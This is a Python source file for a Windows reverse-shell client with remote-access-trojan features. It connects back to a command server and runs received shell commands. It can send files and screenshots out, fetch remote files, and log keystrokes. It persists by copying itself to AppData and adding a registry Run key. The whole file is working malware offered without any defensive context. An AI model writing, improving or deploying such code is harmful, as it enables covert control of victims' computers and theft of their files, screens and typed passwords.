#!/usr/bin/python
import base64
import socket
import json
import threading
import time
import os
import shutil
import sys
import requests
import PIL.ImageGrab
from keylogger import keylogger

location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
keylogger_path = os.environ["appdata"] + "\\keylog.txt"
debug = False


def client():
    global s
    seconds = 5
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 6666))
            print("Connected to Server")
            break
        except:
            print("Connection failed, retrying in {} seconds..".format(seconds))
            time.sleep(seconds)


def shell():
    global debug
    while True:
        cmd = reliable_recv()
        if cmd == "exit":
            reliable_send("exiting...")
            s.close()
            return
        elif cmd.startswith("cd") and len(cmd) > 1:
            try:
                os.chdir(cmd[3:])
            except Exception as e:
                if debug:
                    print(e)
                continue
        elif cmd.startswith("download"):
            download(cmd[9:])
        elif cmd.startswith("upload"):
            upload(cmd[7:])
        elif cmd.startswith("get"):
            download_remote(cmd)
        elif cmd.startswith("persistence"):
            persistence()
        elif cmd.startswith("screenshot"):
            screenshot()
        elif cmd.startswith("isadmin"):
            is_admin()
        elif cmd.startswith("keylogger"):
            keyloggerUtil(cmd)
        else:
            try:
                proc = os.popen(cmd)  # open a process to run commands on shell
                res = proc.read()  # command result
                reliable_send(res)
            except Exception as e:
                reliable_send("Unrecognized command")
                if debug:
                    print(e)


def reliable_send(data):
    json_data = json.dumps(data).encode()
    s.send(json_data)


def reliable_recv():
    json_data = bytearray()
    while True:
        try:
            json_data = json_data + s.recv(1024)
            return json.loads(json_data.decode())
        except ValueError:
            continue
        except Exception as e:
            if debug:
                print(e)


def screenshot():
    """
    Perform a screenshot and send to the host
    """
    try:
        filename = "capture.png"
        capture = PIL.ImageGrab.grab()
        capture.save(filename)
        download(filename)
        os.remove(filename)
    except Exception as e:
        reliable_send("Error taking the screenshot")
        if debug:
            print(e)


def download_remote(cmd):
    """
    Download a remote file
    :param cmd:
    """
    try:
        url = cmd[4:]
        file_name = url.split("/")[-1]
        response = requests.get(url)
        with open(file_name, "wb") as out_file:
            out_file.write(response.content)
            reliable_send("Download completed")
    except Exception as e:
        reliable_send("Download failed")
        if debug:
            print(e)


def download(filename):
    """
    Send the file to the host
    :param filename:
    :return:
    """
    try:
        with open(filename, "rb") as file:
            b64 = base64.b64encode(file.read())
            string = b64.decode()
            reliable_send(string)
    except Exception as e:
        if debug:
            print(e)


def upload(filename):
    """
    Receive a file from the host
    :param filename:
    :return:
    """
    try:
        with open(filename, "wb") as file:
            result = reliable_recv()
            # convert result from string to bytes, then decode b64
            file.write(base64.b64decode(result.encode()))
            reliable_send("Upload completed")
            return True
    except Exception as e:
        reliable_send("Operation failed")
        if debug:
            print(e)


#
def persistence():
    """
    Acquire persistence writing on Windows registry to autorun on startup
    """

    if not os.path.exists(location):
        # Copy this .exe file into the specified location
        shutil.copyfile(sys.executable, location)
        # Add register key to HKEY_CURRENT_USER autorun allowed services (Microsoft\Windows\...\Run)
        # name the entry (/v), define the common register Type (/t), define the Data part (/d)
        os.popen(
            'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
        # image_open()
        reliable_send("Persistence Acquired")
    else:
        reliable_send("Persistence already acquired")


def image_open():
    """
    Copy the image in a temp folder and open it
    """
    name = sys._MEIPASS + "\image.jpg"
    try:
        os.popen(name)
    except Exception as e:
        if debug:
            print(e)


def is_admin():
    """
    Check if current user has admin privileges trying reading Windows folder
    :return:
    """
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
        reliable_send("Host has Administrative privileges")
        return True
    except:
        reliable_send("Host has User privileges")
        return False


def keyloggerUtil(cmd):
    global t1
    """
    manage keylogger util
    :param cmd:
    """
    cmd = cmd[10:]
    if cmd.startswith("start"):
        t1 = threading.Thread(target=keylogger.keylogger_start)
        t1.start()
        reliable_send("keylogger started")
    elif cmd.startswith("dump"):
        log = keylogger.get_log()
        reliable_send(log)
    elif cmd.startswith("stop"):
        os.kill(t1.native_id, 0)
        reliable_send("keylogger stopped")
    else:
        reliable_send("unkown keylogger command")


if __name__ == '__main__':
    client()
    shell()
